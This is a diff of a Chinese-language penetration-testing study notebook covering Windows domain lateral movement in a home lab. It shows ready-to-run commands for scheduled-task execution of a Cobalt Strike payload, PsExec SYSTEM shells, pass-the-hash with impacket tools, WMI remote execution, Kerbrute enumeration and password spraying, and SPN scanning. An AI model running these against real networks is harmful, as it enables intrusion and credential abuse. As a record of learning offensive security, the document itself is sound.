@@ -1,3 +1,5 @@
+
+
 内网Learn
 
 [toc]
@@ -787,17 +789,167 @@ KDC 服务框架中包含一个krbtgt账户，它是在创建域时系统自动�
 在 Kerberos 最初设计的几个流程里说明了如何证明 Client 是 Client 而不是由其他人来冒充的，但并没有声明 Client 有没有访问 Server 服务的权限，因为在域中不同权限的用户能够访问的资源是有区别的。
 所以微软为了解决这个问题在实现 Kerberos 时加入了 PAC 的概念，PAC 的全称是 Privilege Attribute Certificate(特权属性证书)。可以理解为火车有一等座，也有二等座，而 PAC 就是为了区别不同权限的一种方式。
 
-## 4.Kerberos相关攻击技巧
+
+
+
+
+
+
+# 7.横向移动总结
+
+## Windows远程连接命令
+
+### IPC连接
+
+条件：
+
+```
+1.开放了139、445端口；
+2.目标开启ipc$文件共享；
+3.获取用户账号密码；
+```
+
+ipc+计划任务恒横向移动：
+
+（1）首先建立向目标主机的`IPC$`连接
+
+（2）命令执行的脚本传到目标主机
+
+（3）创建计划任务在目标机器上执行命令脚本
+
+（4）删除`IPC$`连接
+
+**连接**：
+
+![image-20220319141047308](README/image-20220319141047308.png)
+
+**映射**：
+
+`net use z: \\192.168.188.100\c$ Admin123! /user:Administrator`（把目标C盘映射到本地z盘）
+
+![image-20220319141844900](README/image-20220319141844900.png)
+
+
+
+**访问/删除路径**：
+
+```
+net use z: \\192.168.188.100\c$   #直接访问
+net use c: /del                 删除映射的c盘，其他盘类推 
+net use * /del                 删除全部,会有提示要求按y确认
+```
+
+**删除IPC连接**：
+
+`net use \\192.168.188.100\ipc$ /del`
+
+### at命令
+
+>   at 命令是Windows自带的用于创建计划任务的命令，但是at 命令只在2003及以下的版本使用。我们可以通过at命令通过跳板机在目标主机DC上创建计划任务，让计算机在指定的时间执行木马程序，从而获得对内网目标主机的控制。
+
+at计划命令在实战中主要有两个用处：一是在获取webshell后不能够执行系统命令的情况下可以用at命令将命令执行后写入txt再用type读取，二是利用at计划任务命令上线cs或者msf
+
+因为at只在2003以下，这里使用win2003（）的机子。
+
+```
+at \\192.168.188.100 14:27:00 cmd.exe /c "ipconig > c:\result.txt"
+```
+
+之后使用type读取
+
+![image-20220319143430449](README/image-20220319143430449.png)
+
+一定要注意主机的时间，使用`net time \\192.168.188.100`查看
+
+**删除计划任务**：
+
+```javascript
+at \\192.168.188.100 1 /delete
+```
+
+
+
+### schtash命令
+
+2008及以上都没at了，使用schtash代替。
+
+可以直接将cs的exe copy到目标机：
+
+```javascript
+copy C:\xxxx\artifact.exe \\192.168.188.100\c$
+```
+
+之后使用schtash创建计划任务：
+
+```javascript
+schtasks /create /TN cs /s 192.168.188.100 /u "Administrator" /p "Admin123!" /TR C:\artifact.exe /SC once /ST 17:32
+
+/TN 指定任务的名称
+/s 指定远程计算机的名称或 IP 地址
+/TR 指定任务运行的程序或命令
+/SC 指定计划类型。 
+/ST 使用24小时时间格式 HH： mm 指定任务的开始时间。
+
+
+查看帮助
+schtasks /create /?
+
+执行计划任务
+schtasks /run /tn cs /s 192.168.188.100 /u "Administrator" /p "Admin123!"
+
+查看运行状态
+schtasks /query /s 192.168.188.100 /u "Administrator" /p "Admin123!" | findstr "cs"
+
+删除
+schtasks /delete /F /tn todayfive /s 192.168.188.100 /u "Administrator" /p "Admin123!"
+/f 禁止显示确认消息。 删除任务但不发出警告
+```
+
+## 使用PsExec
+
+微软自家的，不会被杀
+
+[tool_download](https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec)
+
+需要远程系统开启admin共享（默认是开启的），原理是基于IPC共享，目标需要开放445端口和admin
+
+```
+PsExec64.exe -accepteula \\192.168.188.100 -u WIN-4JS3YOGGQ2T\administrator -p Admin123! -s cmd.exe
+
+-accepteula：第一次运行psexec会弹出确认框，使用该参数就不会弹出确认框
+-s：以system权限运行运程进程，获得一个system权限的交互式shell。如果不使用该参数，会获得一个连接所用用户权限的shell
+```
+
+也可以net连上之后psexec：
+
+```
+net use \\192.168.188.100\ipc$ Admin123! /user:administrator 
+
+PsExec.exe -accepteula \\192.168.188.100 cmd.exe
+or
+PsExec.exe -accepteula \\192.168.188.100 ipconfig
+```
+
+注意要关UAC或者加注册表：
+
+```
+HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionPoliciesSystem
+添加新DWORD值，键值：LocalAccountTokenFilterPolicy 为1。
+```
+
+但我一直是拒绝访问，，，，不知道为啥。。。。。
+
+
+
+## PTH(Hash传递攻击，pass the hash)
 
 [Kerberos相关攻击技巧](https://xz.aliyun.com/t/8690)
-
-### Hash传递攻击（PTH）
 
 [Hash传递攻击](https://cloud.tencent.com/developer/article/1829649)
 
 [内网渗透之命令行渗透 - 渗透红队笔记](https://cloud.tencent.com/developer/article/1752168)
 
-#### 简介
+### 简介
 
 PTH攻击是指攻击者可以通过捕获密码的hash值（无需解密），简单地将其传递来进行身份验证，以此来横向访问其他网络系统。
 
@@ -809,7 +961,7 @@ PTH攻击是指攻击者可以通过捕获密码的hash值（无需解密），�
 >
 >   [mimikatz](https://github.com/gentilkiwi/mimikatz)
 
-#### 使用mimikatz
+### 使用mimikatz
 
 使用mimikatz抓取密码或者hash，其实如果在域内主机可以获取到明文密码，我们可以使用明文密码进行登录，但是在很多情况下，由于域内密码复杂度要求，我们可能无法获取到域内主机明文密码，这就导致我们必须使用hash传递来获取域控权限。
 
@@ -917,83 +1069,71 @@ type \\192.168.188.100\c$\users\administrator\desktop\1.txt
 
 [PTH(Pass The Hash)哈希传递攻击手法与防范](https://cloud.tencent.com/developer/article/1829649)
 
-### 域外用户枚举
+### psexec
 
-在域外也能和域进行交互的原因，是利用了kerberos协议认证中的AS-REQ阶段。只要我们能够访问域控88(kerberos服务)端口，就可以通过这种方式去枚举用户名并且进行kerberos协议的暴力破解了！
-
-Kerbrute使用的是kerberos pre-auth协议，不会产生大量的日志 (4625 - An account failed to log on)，但是会产生以下日志：
-
--   口令验证成功时产生日志 (4768 - A Kerberos authentication ticket (TGT) was requested)
--   口令验证失败时产生日志 (4771 - Kerberos pre-authentication failed)
-
-#### 攻击方法
-
-##### kerbrute_windows_amd64.exe
-
->   [kerbrute_windows_amd64.exe](https://github.com/ropnop/kerbrute/releases)
-
-在这里我们需要获取dc的ip，域名。将想要爆破的用户放入user.txt表中，这样就可以获取到了！
+这里的和上面的那个psexec不一样，这个是impacket套装里的
 
 ```
-kerbrute_windows_amd64.exe userenum --dc 192.168.188.100 -d ghost.com user.txt
+psexec.exe Administrator@192.168.188.100 -hashes 00000000000000000000000000000000:520126a03f5d5a8d836f1c4f34ede7ce
+or
+psexec.exe Administrator@192.168.188.100 -hashes :520126a03f5d5a8d836f1c4f34ede7ce
 ```
 
-![image-20220318191443842](README/image-20220318191443842.png)
+![image-20220319161231967](README/image-20220319161231967.png)
 
-之后爆破
 
-```
-kerbrute_windows_amd64.exe passwordspray -d 192.168.188.100 -d ghost.com Admin123!
-```
 
-![image-20220318191719021](README/image-20220318191719021.png)
-
-#### PY版本 pyKerbrute
-
->   [pyKerbrute](https://github.com/3gstudent/pyKerbrute)
-
-不演示了，爆破用户：
+### wmiexec
 
 ```
-python2 EnumADUser.py 192.168.188.100 ghost.com user.txt tcp
-python2 EnumADUser.py 192.168.188.100 ghost.com user.txt udp
+wmiexec.exe -hashes :520126a03f5d5a8d836f1c4f34ede7ce ghost/dc@192.168.188.100 "ipconfig"
+
+wmiexec.exe -hashes :520126a03f5d5a8d836f1c4f34ede7ce ghost/dc@192.168.188.100
 ```
 
-口令爆破：
+![image-20220319160157984](README/image-20220319160157984.png)
+
+### smbexec
 
 ```
-#明文
-python2 ADPwdSpray.py 192.168.188.100 ghost.com user.txt clearpassword Admin123! tcp
-
-#hash
-python2 ADPwdSpray.py 192.168.188.100 ghost.com user.txt ntlmhash aaaaaaaaaaaaaaaaaaaa(hash) udp
+smbexec.exe  -hashes :520126a03f5d5a8d836f1c4f34ede7ce ghost/dc@192.168.188.100
 ```
 
+![image-20220319160656572](README/image-20220319160656572.png)
 
 
-参考：
 
->   ```
->   https://mp.weixin.qq.com/s/-V1gEpdsUExwU5Fza2YzrA
->   https://mp.weixin.qq.com/s/vYeR9FDRUfN2ZczmF68vZQ
->   https://mp.weixin.qq.com/s?__biz=MzI0MDY1MDU4MQ==&mid=2247496592&idx=2&sn=3805d213ba1013e320f48169516c2ca3&chksm=e91523aade62aabc21ebca36a5216f63ec0d4c61e3dd1b4632c10adbb85dfde07e6897897fa5&scene=21#wechat_redirect
->   https://blog.csdn.net/weixin_41598660/article/details/109152077
->   https://xz.aliyun.com/t/7724#toc-4
->   https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
->   http://hackergu.com/ad-information-search-powerview/
->   https://www.freebuf.com/news/173366.html
->   https://www.cnblogs.com/mrhonest/p/13372203.html
->   https://payloads.online/scripts/Invoke-DomainPasswordSpray.txt
->   https://github.com/dafthack/DomainPasswordSpray
->   https://blog.csdn.net/qq_36119192/article/details/105088239
->   https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe
->   ```
+### WMI
 
-### 密码喷洒攻击(Password Spraying)
+>   WMI以CIMOM为基础，CIMOM即[公共信息模型](https://baike.baidu.com/item/公共信息模型/2719581)[对象管理器](https://baike.baidu.com/item/对象管理器/21508570)（Common Information Model Object Manager），是一个描述操作系统构成单元的对象数据库，为MMC和[脚本程序](https://baike.baidu.com/item/脚本程序/1265903)提供了一个访问操作系统构成单元的公共接口。
 
-### KB22871997补丁与PTH攻击
+#### 查询进程信息
 
-### Pass the Hash with Remote Desktop
+```javascript
+wmic /node:192.168.188.100 /user:administrator /password:Admin123! process list brief
+```
+
+![image-20220319165203798](README/image-20220319165203798.png)
+
+#### 远程创建进程
+
+```javascript
+wmic /node:192.168.188.100 /user:administrator /password:Admin123! process call create "cmd.exe /c ipconfig > C:\result.txt"
+```
+
+![image-20220319165338212](README/image-20220319165338212.png)
+
+#### wmiexec
+
+上面写过了。。。
+
+```
+wmiexec.exe -hashes :520126a03f5d5a8d836f1c4f34ede7ce ghost/dc@192.168.188.100
+```
+
+![image-20220319165549388](README/image-20220319165549388.png)
+
+## PTT(Pass the ticket)
 
 ### 黄金票据
 
@@ -1192,13 +1332,6 @@ kerberos::golden /domain:ghost.com /sid:S-1-5-21-1238213221-2393825874-288113696
 -   Silver Ticket 可以直接跳过 KDC 直接访问对应的服务器
 
 
-
-### AS-REP Roasting攻击
-
-### SPN 扫描
-
-### Kerberosast攻击
-
 ### MS14-068
 
 能够将任意一台域机器提升成域控相关权限
@@ -1237,3 +1370,132 @@ kerberos::ptc TGT_yutaowin10@ghost.com.ccache
 dir \\WIN-4JS3YOGGQ2T\c$
 ```
 
+
+
+### 域外用户枚举
+
+在域外也能和域进行交互的原因，是利用了kerberos协议认证中的AS-REQ阶段。只要我们能够访问域控88(kerberos服务)端口，就可以通过这种方式去枚举用户名并且进行kerberos协议的暴力破解了！
+
+Kerbrute使用的是kerberos pre-auth协议，不会产生大量的日志 (4625 - An account failed to log on)，但是会产生以下日志：
+
+-   口令验证成功时产生日志 (4768 - A Kerberos authentication ticket (TGT) was requested)
+-   口令验证失败时产生日志 (4771 - Kerberos pre-authentication failed)
+
+#### 攻击方法
+
+##### kerbrute_windows_amd64.exe
+
+>   [kerbrute_windows_amd64.exe](https://github.com/ropnop/kerbrute/releases)
+
+在这里我们需要获取dc的ip，域名。将想要爆破的用户放入user.txt表中，这样就可以获取到了！
+
+```
+kerbrute_windows_amd64.exe userenum --dc 192.168.188.100 -d ghost.com user.txt
+```
+
+![image-20220318191443842](README/image-20220318191443842.png)
+
+之后爆破
+
+```
+kerbrute_windows_amd64.exe passwordspray -d 192.168.188.100 -d ghost.com Admin123!
+```
+
+![image-20220318191719021](README/image-20220318191719021.png)
+
+#### PY版本 pyKerbrute
+
+>   [pyKerbrute](https://github.com/3gstudent/pyKerbrute)
+
+不演示了，爆破用户：
+
+```
+python2 EnumADUser.py 192.168.188.100 ghost.com user.txt tcp
+python2 EnumADUser.py 192.168.188.100 ghost.com user.txt udp
+```
+
+口令爆破：
+
+```
+#明文
+python2 ADPwdSpray.py 192.168.188.100 ghost.com user.txt clearpassword Admin123! tcp
+
+#hash
+python2 ADPwdSpray.py 192.168.188.100 ghost.com user.txt ntlmhash aaaaaaaaaaaaaaaaaaaa(hash) udp
+```
+
+
+
+参考：
+
+>   ```
+>   https://mp.weixin.qq.com/s/-V1gEpdsUExwU5Fza2YzrA
+>   https://mp.weixin.qq.com/s/vYeR9FDRUfN2ZczmF68vZQ
+>   https://mp.weixin.qq.com/s?__biz=MzI0MDY1MDU4MQ==&mid=2247496592&idx=2&sn=3805d213ba1013e320f48169516c2ca3&chksm=e91523aade62aabc21ebca36a5216f63ec0d4c61e3dd1b4632c10adbb85dfde07e6897897fa5&scene=21#wechat_redirect
+>   https://blog.csdn.net/weixin_41598660/article/details/109152077
+>   https://xz.aliyun.com/t/7724#toc-4
+>   https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
+>   http://hackergu.com/ad-information-search-powerview/
+>   https://www.freebuf.com/news/173366.html
+>   https://www.cnblogs.com/mrhonest/p/13372203.html
+>   https://payloads.online/scripts/Invoke-DomainPasswordSpray.txt
+>   https://github.com/dafthack/DomainPasswordSpray
+>   https://blog.csdn.net/qq_36119192/article/details/105088239
+>   https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe
+>   ```
+
+## SPN 扫描
+
+>   SPN全程 Service Principal Names，是服务器上所运行服务的唯一标识，每个使用kerberos认证的服务都需要一个SPN。
+>   SPN分为两种，一种注册在AD的机器账户下(Computers)下，另一种注册在域用户账户(Users)下
+>   当一个服务的权限为Local System或Network Service，则SPN注册在机器账户(Computers)下
+>   当一个服务的权限为一个域用户，则SPN注册在域用户账户(Users)下
+
+SPN扫描能让我们更快的发现在域内运行的服务，并且很难被发现
+
+###  SPN格式
+
+```
+serviceclass/host:port/servicename
+```
+
+说明：
+
+-   serviceclass可以理解为服务的名称，常见的有www,ldap,SMTP,DNS,HOST等
+-   host有两种形式，FQDN和NetBIOS名，例如server01.test.com和server01
+-   如果服务运行在默认端口上，则端口号(port)可以省略
+
+### SPN 查询
+
+查看当前域内的所有SPN:
+
+```
+setspn.exe -q */*
+```
+
+查询具体域所有SPN：
+
+![image-20220319170505083](README/image-20220319170505083.png)
+
+以CN开头的每一行代表一个账户，下面的信息是与之关联的SPN
+对于上面的输出数据，机器账户(Computers)为：
+
+```
+CN=WIN-4JS3YOGGQ2T,OU=Domain Controllers,DC=ghost,DC=com
+CN=DM_WIN2003,CN=Computers,DC=ghost,DC=com
+CN=DM_WINXP,CN=Computers,DC=ghost,DC=com
+CN=DM_WIN10,CN=Computers,DC=ghost,DC=com
+CN=DM_WIN10_2,CN=Computers,DC=ghost,DC=com
+```
+
+域用户：
+
+```
+CN=krbtgt,CN=Users,DC=ghost,DC=com
+```
+
+## 域委派
+
+
+
+[toc]
